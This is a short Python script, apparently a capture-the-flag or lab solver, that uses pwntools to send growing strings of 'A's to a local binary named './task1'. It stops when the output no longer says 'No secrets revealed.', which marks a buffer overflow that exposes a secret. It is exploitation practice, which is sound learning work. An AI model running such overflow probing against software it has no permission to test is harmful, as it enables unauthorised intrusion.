#!/usr/bin/python3

from pwn import *

## Function to test for buffer overflows in binary files
def bufferOverFlowTest(binary,numberOfChars,expectedString=""):
        io = process(binary)
        io.sendlineafter(b':', b'A'*numberOfChars)
        result=io.recvall().decode()
        io.kill()
        if(expectedString not in result):
                print("################ Successfully buffer overflowed at "+str(numberOfChars)+" chars")
                print(result)
                return 1;
        else:
                return 2;

# Loop through 100 values
for i in range(1,100):
        if(bufferOverFlowTest("./task1",i,"No secrets revealed.")!=2):
                break
